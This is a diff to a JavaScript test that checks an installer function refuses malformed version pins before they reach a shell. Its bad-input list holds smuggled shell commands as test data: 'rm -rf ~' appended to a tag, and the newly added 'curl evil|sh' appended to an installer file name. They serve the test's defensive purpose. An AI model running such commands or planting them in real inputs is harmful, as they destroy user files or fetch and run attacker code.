@@ -26,7 +26,7 @@ test("a platform with no build, a pin with no installer, and a malformed pin eac
         assert.ok(!r.ok && /no window-ml-host build/.test(r.why), `${p.os} ${p.arch}`);
     }
     assert.match(hostInstall({ os: "mac", arch: "arm64" }, ID, { tag: "v0.9.0" }).why, /no installer/, "v0.9.0 has none");
-    for (const bad of [{ tag: "v0.10.0; rm -rf ~", installer: PIN.installer }, { tag: "v0.10.0", installer: { file: "install.sh", sha256: "x".repeat(64) } }]) {
+    for (const bad of [{ tag: "v0.10.0; rm -rf ~", installer: PIN.installer }, { tag: "v0.10.0", installer: { file: "install.sh; curl evil|sh", sha256: "ab".repeat(32) } }, { tag: "v0.10.0", installer: { file: "install.sh", sha256: "x".repeat(64) } }]) {
         assert.ok(!hostInstall({ os: "mac", arch: "arm64" }, ID, bad).ok, "a pin that is not a tag and a hash is refused before it reaches a shell");
     }
 });
